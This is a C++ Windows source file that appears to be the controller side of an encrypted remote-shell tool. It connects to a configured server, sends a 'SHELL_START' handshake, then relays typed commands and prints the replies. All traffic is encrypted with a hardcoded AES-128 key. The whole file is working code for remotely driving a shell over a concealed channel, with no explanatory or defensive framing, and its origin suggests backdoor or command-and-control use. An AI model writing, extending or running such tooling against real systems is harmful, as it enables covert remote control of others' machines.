#include "client.h"

#pragma comment(lib, "ws2_32.lib")

static uint8 key[16] = {
    0x0f,0x15,0x71,0xc9,
    0x47,0xd9,0xe8,0x59,
    0x0c,0xb7,0xad,0xd6,
    0xaf,0x7f,0x67,0x98
};

using namespace std;

void proc_output(SOCKET client_socket)
{
    while (true) {
        char recv_data[BUFFER_SIZE] = {};
        int buf_len = recv(client_socket, recv_data, BUFFER_SIZE, 0);
        if (buf_len < 0) {
            cout << "[!] failed to receive data (" << GetLastError() << ")!" << endl;
            break;
        }
        char* decrypt_data = NULL;
        decrypt_payload(recv_data, decrypt_data, buf_len);
        cout << decrypt_data;
    }
}

int main() 
{
    aes_set_key(&g_aes_ctx, key, 128);
    WORD winsock_version = MAKEWORD(2, 2);
    WSADATA wsa_data;
    if (WSAStartup(winsock_version, &wsa_data) != 0) {
        cout << "[!] failed to init socket dll!" << endl;
        return 0;
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.S_un.S_addr = inet_addr(SERVER_IP);

    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client_socket == INVALID_SOCKET) {
        cout << "[!] failed to create server socket!" << endl;
        return 0;
    }

    sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_addr.S_un.S_addr = inet_addr(CLIENT_IP);
    if (bind(client_socket, (LPSOCKADDR)&client_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        cout << "[!] failed to bind port!" << endl;
        return 0;
    }

    cout << "[*] bind to address:" << CLIENT_IP << ": " << CLIENT_PORT << " successfully!" << endl;
    if (connect(client_socket, (LPSOCKADDR)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        cout << "[!] failed to connect server!" << endl;
        return 0;
    }

    cout << "[*] connect to address:" << SERVER_IP << ": " << SERVER_PORT << " successfully!" << endl;
    thread output_thread = thread(proc_output, client_socket);

    char* shell_start_buf;
    UINT buf_len;
    encrypt_payload(SHELL_START, shell_start_buf, buf_len);
    if (send(client_socket, shell_start_buf, buf_len, 0) < 0) {
        cout << "[!] failed to send data(" << GetLastError() << ")!" << endl;
    }
    output_thread.detach();
    while (true) {
        string data;
        cin >> data;
        data += "\r\n";
        UINT data_len;
        char* encrypt_data;
        encrypt_payload(data.c_str(), encrypt_data, data_len);
        if (send(client_socket, encrypt_data, data_len, 0) < 0) {
            cout << "[!] failed to send data!" << endl;
            free(encrypt_data);
            break;
        }
        free(encrypt_data);
    }

    closesocket(client_socket);
    WSACleanup();

    return 0;
}

void encrypt_payload(const char* original_buf, char*& encrypt_buf, UINT& buf_len)
{
    buf_len = strlen(original_buf);
    buf_len = (buf_len / 16 + 1) * 16;
    encrypt_buf = (char*)malloc(buf_len);
    if (!encrypt_buf)
        return;
    memset(encrypt_buf, 0, buf_len);
    memcpy(encrypt_buf, original_buf, strlen(original_buf));
    char* tmp = encrypt_buf;
    for (int i = 0; i != buf_len; i += 16)
    {
        aes_encrypt(&g_aes_ctx, (uint8*)tmp);
        tmp += 16;
    }
}

void decrypt_payload(const char* encrypt_buf, char*& decrypt_buf, UINT buf_len)
{
    decrypt_buf = (char*)malloc(buf_len);
    memcpy(decrypt_buf, encrypt_buf, buf_len);
    char* tmp = decrypt_buf;
    for (int i = 0; i != buf_len; i += 16)
    {
        aes_decrypt(&g_aes_ctx, (uint8*)tmp);
        tmp += 16;
    }
}